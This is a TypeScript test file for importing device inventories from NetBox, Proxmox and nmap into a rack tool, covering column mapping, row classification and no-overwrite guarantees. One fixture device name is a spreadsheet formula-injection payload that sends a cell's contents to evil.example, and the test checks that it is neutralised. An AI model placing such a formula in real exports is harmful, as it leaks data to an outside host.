import { describe, expect, it } from 'vitest';

import { applyPlan } from './apply';
import { devicesByName } from './existing';
import { fieldValue } from '../document/fields';
import { defaultMapping, inferType, mappingErrors, type Mapping } from './mapping';
import { addressFor, buildPlan, choiceKey, roleFor, type Bucket } from './plan';
import { ACTOR, CATALOGUE, COST_CENTRE, NOW, addDevice, docWithRack, fixture, freshDefs, fullMapping, gated, identity, readImport } from './testkit';
import { gateTable } from './gate';

const csv = async () => gated(readImport(fixture('netbox-devices.csv')));

async function csvPlan() {
  let { doc } = docWithRack();
  doc = addDevice(doc, 'sw-01', { serial: 'JN123456AB' });
  doc = addDevice(doc, 'fw-01', { serial: 'OLD-SERIAL', role: 'router', mgmt: '10.0.99.1' });
  const table = await csv();
  const mapping = fullMapping(table, [COST_CENTRE]);
  return { doc, table, mapping, plan: buildPlan(table, mapping, { doc, catalogue: CATALOGUE, defs: [COST_CENTRE] }) };
}

describe('default mapping', () => {
  it('maps NetBox columns to Fathom fields and the rest to new shared fields', async () => {
    const { table, mapping } = await csvPlan();
    const of = (h: string) => mapping[table.headers.indexOf(h)];
    expect(of('name')).toEqual({ kind: 'core', key: 'name' });
    expect(of('device_type')).toEqual({ kind: 'core', key: 'model' });
    expect(of('manufacturer')).toEqual({ kind: 'core', key: 'vendor' });
    expect(of('primary_ip4')).toEqual({ kind: 'core', key: 'mgmt' });
    expect(of('position')).toEqual({ kind: 'core', key: 'unit' });
    expect(of('comments')).toEqual({ kind: 'core', key: 'notes' });
    expect(of('description')).toEqual({ kind: 'core', key: 'notes' });
    expect(of('cf_owner')).toEqual({ kind: 'new', name: 'Owner', type: 'text' });
    expect(of('cf_warranty_end')).toEqual({ kind: 'new', name: 'Warranty end', type: 'date' });
    expect(of('cf_budget')).toEqual({ kind: 'new', name: 'Budget', type: 'number' });
    expect(mappingErrors(table, mapping, [COST_CENTRE])).toEqual([]);
  });

  it('reuses a shared field that already has the name, and refuses two columns for one Name', async () => {
    const table = await gated(readImport('name,Cost centre,hostname\nsw,IT-1,x\n'));
    const m = defaultMapping(table, [COST_CENTRE]);
    expect(m[1]).toEqual({ kind: 'field', defId: COST_CENTRE.id });
    const two: Mapping = [{ kind: 'core', key: 'name' }, { kind: 'ignore' }, { kind: 'core', key: 'name' }];
    expect(mappingErrors(table, two, [])).toContain('Exactly one column must be the Name.');
    expect(mappingErrors(table, [{ kind: 'ignore' }, { kind: 'ignore' }, { kind: 'ignore' }], [])).toContain('Exactly one column must be the Name.');
  });

  it('infers number, date and link only when every value fits; else text', () => {
    expect(inferType(['1', '2.5', '-3'])).toBe('number');
    expect(inferType(['2028-03-01', '2029-01-15'])).toBe('date');
    expect(inferType(['2028-13-01'])).toBe('text');
    expect(inferType(['https://a.example/x', 'http://b'])).toBe('url');
    expect(inferType(['1', 'two'])).toBe('text');
    expect(inferType(['', ''])).toBe('text');
  });

  it('Proxmox: keeps the useful columns and leaves the disk noise unmapped; nmap maps its own columns', async () => {
    const px = await gated(readImport(fixture('pvesh-qemu-config.json')));
    const m = defaultMapping(px, []);
    const kinds = Object.fromEntries(px.headers.map((h, i) => [h, m[i]!.kind === 'ignore' ? 'ignore' : m[i]!.kind === 'core' ? (m[i] as { key: string }).key : 'field']));
    expect(kinds).toMatchObject({ name: 'name', ip: 'mgmt', tags: 'tags', description: 'notes', cores: 'field', scsi0: 'ignore', digest: 'ignore' });
  });
});

describe('classification', () => {
  it('sorts the NetBox CSV into New, Match, Differ and No model, with a reason for each free box', async () => {
    const { plan } = await csvPlan();
    const by = (b: Bucket) => plan.items.filter((i) => i.bucket === b).map((i) => i.name);
    expect(by('new')).toEqual(['sw-02', `'=HYPERLINK("http://evil.example/?x="&A1)`]);
    expect(by('match')).toEqual(['sw-01']);
    expect(by('differ')).toEqual(['fw-01']);
    expect(by('nomodel')).toEqual(['core-01', 'wifi-ap-3', 'Core-Switch-2']);
    expect(by('skipped')).toEqual(['sw-01']);
    expect(plan.counts).toEqual({ new: 2, match: 1, differ: 1, nomodel: 3, skipped: 1 });
    const why = Object.fromEntries(plan.items.map((i) => [i.name, i.reason]));
    expect(why['core-01']).toBe('U31 in R1 is taken.');
    expect(why['wifi-ap-3']).toMatch(/not in the catalogue/);
    expect(plan.items.find((i) => i.bucket === 'skipped')!.reason).toMatch(/earlier in the file/);
    const spaced = plan.items.find((i) => i.name === 'Core-Switch-2')!;
    expect(spaced.warnings.join(' ')).toMatch(/serial/);
    expect(spaced.warnings.join(' ')).toMatch(/not an IP address/);
    expect(spaced.notes).toContain('Model in the file: Box 9000');
  });

  it('Match fills blanks only; Differ lists both sides', async () => {
    const { plan } = await csvPlan();
    const match = plan.items.find((i) => i.bucket === 'match')!;
    expect(match.conflicts).toEqual([]);
    expect(match.fills.map((f) => f.key)).toEqual(expect.arrayContaining(['role', 'mgmt']));
    const differ = plan.items.find((i) => i.bucket === 'differ')!;
    expect(differ.conflicts).toEqual([
      { key: 'serial', label: 'Serial', mine: 'OLD-SERIAL', theirs: 'JN998877EF' },
      { key: 'role', label: 'Role', mine: 'router', theirs: 'firewall' },
    ]);
  });

  it('places New devices only where the rack, unit and catalogue model allow', async () => {
    const { plan } = await csvPlan();
    const sw02 = plan.items.find((i) => i.name === 'sw-02')!;
    expect(sw02.placement).toMatchObject({ unit: 31, face: 'front' });
    expect(sw02.placement?.model.model).toBe('EX2300-48P');
    const dell = plan.items.find((i) => i.name.startsWith("'=HYPERLINK"))!;
    expect(dell.placement?.model.rackUnits).toBe(2);
  });

  it('role and address helpers', () => {
    expect(roleFor('Access switch')).toBe('switch');
    expect(roleFor('Firewall')).toBe('firewall');
    expect(roleFor('load_balancer')).toBe('load_balancer');
    expect(roleFor('Wireless AP')).toBe('access_point');
    expect(roleFor('Toaster')).toBeNull();
    expect(addressFor('10.0.99.2/24')).toBe('10.0.99.2');
    expect(addressFor('2001:db8::1/64')).toBe('2001:db8::1');
    expect(addressFor('not-an-ip')).toBeNull();
  });

  it('nmap hosts and Proxmox guests with no model all become free boxes', async () => {
    const { doc } = docWithRack();
    for (const f of ['nmap.xml', 'pvesh-resources.json']) {
      const { miniXml } = await import('./testkit');
      const t = await gated(readImport(fixture(f), { xml: miniXml }));
      const plan = buildPlan(t, defaultMapping(t, []), { doc, catalogue: CATALOGUE, defs: [] });
      expect(plan.counts.nomodel, f).toBe(t.rows.length);
      expect(plan.counts.new + plan.counts.match + plan.counts.differ + plan.counts.skipped, f).toBe(0);
    }
  });
});

// A small seeded generator, so a failure can be replayed.
function rng(seed: number) {
  let s = seed >>> 0;
  return () => ((s = (Math.imul(s, 1664525) + 1013904223) >>> 0) / 2 ** 32);
}

describe('match never overwrites (property)', () => {
  it('after any import with the default choice, no existing value changed and only blanks were filled', async () => {
    const roles = ['router', 'switch', 'firewall', ''];
    const serials = ['A1', 'B2', 'C3', ''];
    const addrs = ['10.0.0.1', '10.0.0.2', ''];
    const costs = ['X-1', 'Y-2', ''];
    const mapping: Mapping = [
      { kind: 'core', key: 'name' }, { kind: 'core', key: 'serial' }, { kind: 'core', key: 'role' },
      { kind: 'core', key: 'mgmt' }, { kind: 'field', defId: COST_CENTRE.id },
    ];
    for (let seed = 1; seed <= 60; seed += 1) {
      const r = rng(seed);
      const pick = <T,>(xs: T[]) => xs[Math.floor(r() * xs.length)]!;
      let { doc } = docWithRack();
      const names = ['d1', 'd2', 'd3', 'd4'];
      for (const n of names) doc = addDevice(doc, n, { serial: pick(serials), role: pick(roles), mgmt: pick(addrs), cost: pick(costs) });
      const rows = names.map((n) => [n, pick(serials), pick(roles), pick(addrs), pick(costs)]);
      const table = await gateTable({ kind: 'csv', label: '', headers: ['name', 'serial', 'role', 'mgmt', 'cost'], rows, notes: [] }, identity);
      const plan = buildPlan(table, mapping, { doc, catalogue: CATALOGUE, defs: [COST_CENTRE] });
      const out = await applyPlan(doc, plan, { defs: [COST_CENTRE], fresh: [], actor: ACTOR, now: NOW, label: 'import' });
      const before = devicesByName(doc);
      const after = devicesByName(out.doc);
      for (const [key, b] of before) {
        const a = after.get(key)!;
        for (const f of ['serial', 'role', 'mgmt'] as const) {
          if (b[f] !== '') expect(a[f], `seed ${seed} ${key} ${f}`).toBe(b[f]);
        }
        const cost = fieldValue(doc, b.deviceId, COST_CENTRE.id) ?? '';
        if (cost !== '') expect(fieldValue(out.doc, a.deviceId, COST_CENTRE.id), `seed ${seed} ${key} cost`).toBe(cost);
      }
      // A blank with a value in the file (and no contradiction elsewhere in the row) is filled.
      for (const item of plan.items.filter((i) => i.bucket === 'match')) {
        const a = after.get(item.name.toLowerCase())!;
        for (const f of item.fills) if (f.key === 'serial' || f.key === 'role' || f.key === 'mgmt') expect(a[f.key], `seed ${seed} fill`).toBe(f.theirs);
      }
    }
  });

  it('only a Differ row set to the file\'s values is changed, and then only the values that disagreed', async () => {
    const { doc, plan } = await csvPlan();
    const kept = await applyPlan(doc, plan, { defs: freshDefs(plan.newFields).concat([COST_CENTRE]), fresh: freshDefs(plan.newFields), actor: ACTOR, now: NOW, label: 'import' });
    expect(devicesByName(kept.doc).get('fw-01')).toMatchObject({ serial: 'OLD-SERIAL', role: 'router', mgmt: '10.0.99.1' });
    const row = choiceKey(plan.items.find((i) => i.bucket === 'differ')!);
    const took = await applyPlan(doc, plan, { choices: new Map([[row, 'theirs']]), defs: freshDefs(plan.newFields), fresh: freshDefs(plan.newFields), actor: ACTOR, now: NOW, label: 'import' });
    expect(devicesByName(took.doc).get('fw-01')).toMatchObject({ serial: 'JN998877EF', role: 'firewall', mgmt: '10.0.99.1' });
    expect(took.overwritten).toBe(2);
    expect(kept.overwritten).toBe(0);
    // A choice for a Match row changes nothing.
    const matchRow = choiceKey(plan.items.find((i) => i.bucket === 'match')!);
    const forced = await applyPlan(doc, plan, { choices: new Map([[matchRow, 'theirs']]), defs: freshDefs(plan.newFields), fresh: freshDefs(plan.newFields), actor: ACTOR, now: NOW, label: 'import' });
    expect(devicesByName(forced.doc).get('sw-01')?.serial).toBe('JN123456AB');
    expect(forced.overwritten).toBe(0);
  });
});
